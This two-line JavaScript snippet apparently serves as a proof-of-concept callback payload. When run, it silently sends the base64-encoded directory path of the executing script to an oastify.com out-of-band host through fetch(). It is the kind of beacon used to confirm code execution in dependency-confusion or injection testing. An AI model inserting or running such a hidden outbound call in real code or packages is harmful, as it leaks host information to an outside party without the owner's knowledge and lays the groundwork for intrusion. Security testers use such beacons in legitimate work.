async function hello() { await fetch(`https://example.oastify.com/?cwd=${btoa(__dirname)}`) }
hello()
